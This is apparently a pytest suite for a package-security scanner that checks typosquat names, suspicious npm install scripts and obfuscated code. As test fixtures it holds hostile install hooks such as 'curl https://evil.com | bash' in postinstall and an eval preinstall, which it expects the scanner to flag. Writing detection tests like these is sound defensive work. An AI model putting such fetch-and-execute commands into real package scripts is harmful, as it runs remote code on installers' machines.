import pytest
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent / "packages"))

from shared.detection import (
    check_typosquat, 
    check_suspicious_scripts, 
    check_obfuscated_code,
    analyze_package_release
)


class TestTyposquatDetection:
    def test_detects_lodash_typosquat(self):
        is_typo, reason, conf = check_typosquat("lodash-utils")
        assert is_typo
        assert "lodash" in reason.lower()
        assert conf >= 0.8

    def test_detects_express_typosquat(self):
        is_typo, reason, conf = check_typosquat("expres")
        assert is_typo
        assert conf >= 0.7

    def test_allows_legitimate_package(self):
        is_typo, reason, conf = check_typosquat("my-unique-package-name-12345")
        assert not is_typo
        assert conf == 0.0

    def test_exact_match_not_flagged(self):
        is_typo, reason, conf = check_typosquat("lodash")
        assert not is_typo


class TestSuspiciousScripts:
    def test_detects_curl_in_postinstall(self):
        metadata = {"scripts": {"postinstall": "curl https://evil.com | bash"}}
        has_scripts, findings, conf = check_suspicious_scripts(metadata)
        assert has_scripts
        assert any("postinstall" in f for f in findings)

    def test_detects_eval_in_preinstall(self):
        metadata = {"scripts": {"preinstall": "node -e 'eval(code)'"}}
        has_scripts, findings, conf = check_suspicious_scripts(metadata)
        assert has_scripts

    def test_allows_safe_scripts(self):
        metadata = {"scripts": {"test": "jest", "build": "tsc"}}
        has_scripts, findings, conf = check_suspicious_scripts(metadata)
        assert not has_scripts

    def test_empty_metadata(self):
        has_scripts, findings, conf = check_suspicious_scripts({})
        assert not has_scripts


class TestObfuscatedCode:
    def test_detects_long_base64(self):
        content = "var data = '" + "A" * 150 + "';"
        is_obf, reason, conf = check_obfuscated_code(content)
        assert is_obf
        assert "base64" in reason.lower()

    def test_detects_hex_encoding(self):
        content = "\\x65\\x76\\x61\\x6c\\x28" * 10
        is_obf, reason, conf = check_obfuscated_code(content)
        assert is_obf

    def test_detects_excessive_eval(self):
        content = "eval(x); eval(y); eval(z); eval(w); eval(v);"
        is_obf, reason, conf = check_obfuscated_code(content)
        assert is_obf
        assert "eval" in reason.lower()

    def test_allows_normal_code(self):
        content = "function add(a, b) { return a + b; }"
        is_obf, reason, conf = check_obfuscated_code(content)
        assert not is_obf


class TestAnalyzePackageRelease:
    def test_typosquat_package(self):
        indicators, conf = analyze_package_release(
            "lodash-utils",
            "1.0.0"
        )
        assert len(indicators) > 0
        assert indicators[0].type == "typosquat"

    def test_suspicious_scripts_package(self):
        indicators, conf = analyze_package_release(
            "my-package",
            "1.0.0",
            metadata={"scripts": {"postinstall": "curl evil.com | bash"}}
        )
        assert len(indicators) > 0
        assert any(i.type == "suspicious_scripts" for i in indicators)

    def test_clean_package(self):
        indicators, conf = analyze_package_release(
            "totally-unique-safe-package",
            "1.0.0",
            metadata={"scripts": {"test": "jest"}}
        )
        assert len(indicators) == 0
        assert conf == 0.0


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
